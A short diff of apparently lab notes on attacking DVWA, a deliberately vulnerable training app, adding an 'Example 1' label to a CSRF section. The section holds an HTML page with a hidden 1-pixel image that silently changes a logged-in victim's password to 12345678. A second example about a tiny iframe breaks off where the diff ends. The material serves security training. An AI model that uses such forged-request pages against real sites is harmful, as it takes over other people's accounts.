@@ -27,7 +27,7 @@ Input2: <input type="text"><br>
 
 ## CSRF
 - Create a CSRF page with the following contents:
-- Contains link to change credentials
+- **Example 1:** Contains image with source to change credentials
 ```html
 <!--
 Comments:
@@ -37,5 +37,7 @@ Comments:
 This is a very new web page
 <img width="1" src="http://Win10-IP/dvwa-master/vulnerabilities/csrf/?password_new=12345678&password_conf=12345678&Change=Change">
 ```
+
+- **Example 2:** Contains 1x1 small iframe to 
 
 ### 
